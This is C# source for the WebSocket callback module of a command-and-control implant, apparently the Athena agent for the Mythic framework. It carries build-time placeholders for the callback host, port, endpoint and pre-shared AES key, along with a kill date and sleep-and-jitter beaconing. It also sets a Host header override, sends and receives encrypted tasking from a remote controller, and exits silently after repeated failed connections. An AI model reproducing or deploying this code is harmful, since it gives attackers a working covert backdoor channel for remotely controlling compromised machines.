﻿using Athena.Models;
using Athena.Models.Config;
using Athena.Utilities;
using Newtonsoft.Json;
using System;
using System.IO;
using System.Net.WebSockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Athena
{
    public class Config : IConfig
    {
        public IProfile currentConfig { get; set; }
        public static string uuid { get; set; }
        public DateTime killDate { get; set; }
        public int sleep { get; set; }
        public int jitter { get; set; }
        //public Forwarder forwarder;

        public Config()
        {
            uuid = "%UUID%";
            DateTime kd = DateTime.TryParse("killdate", out kd) ? kd : DateTime.MaxValue;
            this.killDate = kd;
            int sleep = int.TryParse("callback_interval", out sleep) ? sleep : 60;
            this.sleep = sleep;
            int jitter = int.TryParse("callback_jitter", out jitter) ? jitter : 10;
            this.jitter = jitter;
            this.currentConfig = new Websocket();
            //this.forwarder = new Forwarder();
        }
    }

    public class Websocket : IProfile
    {
        public string psk { get; set; }
        public string endpoint { get; set; }
        public string userAgent { get; set; }
        public string hostHeader { get; set; }
        public bool encryptedExchangeCheck { get; set; }
        public ClientWebSocket ws { get; set; }
        public PSKCrypto crypt { get; set; }
        public bool encrypted { get; set; }
        public int connectAttempts { get; set; }

        public Websocket()
        {
            int callbackPort = Int32.Parse("callback_port");
            string callbackHost = "callback_host";
            this.endpoint = "ENDPOINT_REPLACE";
            string callbackURL = $"{callbackHost}:{callbackPort}/{this.endpoint}";
            this.userAgent = "USER_AGENT";
            this.hostHeader = "%HOSTHEADER%";
            this.psk = "AESPSK";
            this.encryptedExchangeCheck = bool.Parse("encrypted_exchange_check");
            if (!string.IsNullOrEmpty(this.psk))
            {
                this.crypt = new PSKCrypto(Config.uuid, this.psk);
                this.encrypted = true;
            }

            this.ws = new ClientWebSocket();

            if (!String.IsNullOrEmpty(this.hostHeader))
            {
                this.ws.Options.SetRequestHeader("Host", this.hostHeader);
            }

            Connect(callbackURL);
        }

        public async Task<bool> Connect(string url)
        {
            this.connectAttempts = 0;
            try
            {
                ws = new ClientWebSocket();
                await ws.ConnectAsync(new Uri(url), CancellationToken.None);

                while (ws.State != WebSocketState.Open)
                {
                    if (this.connectAttempts == 300)
                    {
                        Environment.Exit(0);
                    }
                    await Task.Delay(3000);
                    this.connectAttempts++;
                }
                return true;
            }
            catch
            {
                return false;
            }
        }

        public async Task<string> Send(object obj)
        {
            try
            {
                string json = JsonConvert.SerializeObject(obj);
                if (this.encrypted)
                {
                    json = this.crypt.Encrypt(json);
                }
                else
                {
                    json = await Misc.Base64Encode(Config.uuid + json);
                }

                WebSocketMessage m = new WebSocketMessage()
                {
                    Client = true,
                    Data = json,
                    Tag = String.Empty
                };

                string message = JsonConvert.SerializeObject(m);
                byte[] msg = Encoding.UTF8.GetBytes(message);
                await ws.SendAsync(msg, WebSocketMessageType.Text, true, CancellationToken.None);
                message = await Receive(ws);

                if (String.IsNullOrEmpty(message))
                {
                    return String.Empty;
                }

                m = JsonConvert.DeserializeObject<WebSocketMessage>(message);



                if (this.encrypted)
                {
                    return this.crypt.Decrypt(m.Data);
                }

                if (!string.IsNullOrEmpty(json))
                {
                    return (await Misc.Base64Decode(m.Data)).Substring(36);
                }

                return String.Empty;
            }
            catch
            {
                return String.Empty;
            }
        }
        static async Task<string> Receive(ClientWebSocket socket)
        {
            try
            {
                var buffer = new ArraySegment<byte>(new byte[2048]);
                do
                {
                    WebSocketReceiveResult result;
                    using (var ms = new MemoryStream())
                    {
                        do
                        {
                            result = await socket.ReceiveAsync(buffer, CancellationToken.None);
                            await ms.WriteAsync(buffer.Array, buffer.Offset, result.Count);
                        } while (!result.EndOfMessage);

                        if (result.MessageType == WebSocketMessageType.Close)
                            break;

                        ms.Seek(0, SeekOrigin.Begin);
                        using (var reader = new StreamReader(ms, Encoding.UTF8))
                            return (await reader.ReadToEndAsync());
                    }

                } while (true);

                return String.Empty;
            }
            catch
            {
                return String.Empty;
            }
        }
        ///// <summary>
        ///// Base64 encode a string and return the encoded string
        ///// </summary>
        ///// <param name="plainText">String to encode</param>
        //public static async Task<string> Base64Encode(string plainText)
        //{
        //    var plainTextBytes = Encoding.UTF8.GetBytes(plainText);
        //    return Convert.ToBase64String(plainTextBytes);
        //}

        ///// <summary>
        ///// Base64 encode a byte array and return the encoded string
        ///// </summary>
        ///// <param name="bytes">Byte array to encode</param>
        //public static async Task<string> Base64Encode(byte[] bytes)
        //{
        //    return Convert.ToBase64String(bytes);
        //}

        ///// <summary>
        ///// Base64 decode a string and return the decoded string
        ///// </summary>
        ///// <param name="base64EncodedData">String to decode</param>
        //public static async Task<string> Base64Decode(string base64EncodedData)
        //{
        //    var base64EncodedBytes = Convert.FromBase64String(base64EncodedData);
        //    return Encoding.UTF8.GetString(base64EncodedBytes);
        //}
        private class WebSocketMessage
        {
            public bool Client { get; set; }
            public string Data { get; set; }
            public string Tag { get; set; }
        }
    }
}